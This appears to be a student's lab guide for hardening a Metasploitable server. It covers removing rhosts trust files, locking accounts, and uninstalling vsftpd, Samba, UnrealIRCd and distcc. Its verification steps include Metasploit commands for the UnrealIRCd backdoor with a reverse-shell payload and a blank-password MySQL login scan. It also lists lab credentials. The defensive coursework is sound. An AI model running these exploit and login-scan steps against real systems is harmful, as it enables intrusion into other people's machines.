# CPS 471 Project Guide

Kali Login:
username: student
password: student

## Scripts

Run `ifconfig` on server and kali to get "inet addr"
- server: 172.16.30.60
- kali: 172.16.30.75

## rlogin script
find / -name ".rhosts" 2>/dev/null
find / -name "hosts.equiv" 2>/dev/null

remove all instances of `.rhosts` and `hosts.equiv`

## MySQL script
Start with this `sudo su`
Start wtih `mysql -u root`
create a new account, and give account privileges.

Must add "--ssl=0" so kali can actually connect to server DB:
`spawn mysql -u student -p -h 172.16.30.60 --ssl=0`

### UNNECCESARY ACCOUNTS, SERVICES, APPLICATIONS HAVE BEEN REMOVED
1.Lock Accounts

Run:

`passwd -l user
passwd -l postgres
passwd -l sys
passwd -l klog
passwd -l service`

2. Copy and run the "firewall_setup.sh" script

3. 
`find / -name "hosts.equiv" 2>/dev/null`

`find / -name ".rhosts" 2>/dev/null`

`rm /etc/hosts.equiv`

`rm /root/.rhosts`

`rm /home/msfadmin/.rhosts`

`sudo find / -name 'hosts.equiv' -exec cat "{}" \; find / -name '.rhosts' -exec cat "{}" \;`

Should return nothing.


### SYSTEM NOT VULNERABLE TO ATTEMPTED EXPLOITS

1. vsftpd Backdoor

Stop and disable vsftpd:

`/etc/init.d/vsftpd stop`

`update-rc.d vsftpd disable`

Uninstall it entirely:

`apt-get remove vsftpd`

`apt-get purge vsftpd`

Verify it's gone:

`netstat -tlnp | grep 1524`

2. Samba Backdoor

Stop and disable Samba:

`/etc/init.d/samba stop`

`update-rc.d samba disable`

Uninstall it entirely:

`apt-get remove samba`

`apt-get purge samba`

Verify it's gone:

`dpkg -l | grep samba`

Check nothing is still listening on Samba ports (139, 445):

`netstat -tlnp | grep -E "139|445"`

Verify the exploit fails from Kali after removal:

`smbclient -L //172.16.30.60`

3.ircd exploit

Stop and disable ircd:
`/etc/init.d/unrealircd stop`

Uninstall it:

- `apt-get remove unrealircd`
- `apt-get purge unrealircd`

If it was manually installed (likely on Metasploitable), find and delete it:

`find / -name "unrealircd" 2>/dev/null`

It's typically located at /opt/Unreal3.2/ on Metasploitable:

`rm -rf /opt/Unreal3.2`

Check nothing is listening on IRC ports (6667, 6697):

`netstat -tlnp | grep -E "6667|6697"`

Verify from Kali after removal:

- `use exploit/unix/irc/unreal_ircd_3281_backdoor`
- `set payload cmd/unix/reverse`
- `set RHOST 172.16.30.60`
- `set LHOST 172.16.30.75`
- `exploit`

Should return "connection refused" or fail to connect.

4. remove distcc
Stop the service
`/etc/init.d/distcc stop`

Disable it from starting on boot
`update-rc.d distcc disable`

Uninstall completely
`apt-get remove -y distcc`
`apt-get purge -y distcc`

Verify port 3632 is no longer listening
`netstat -tlnp | grep 3632`

`kill -9 ####`

5. MySQL

Test Kali:
`use auxiliary/scanner/mysql/mysql_login
set BLANK_PASSWORDS true
set RHOSTS 172.16.30.60
set USERNAME root
exploit`
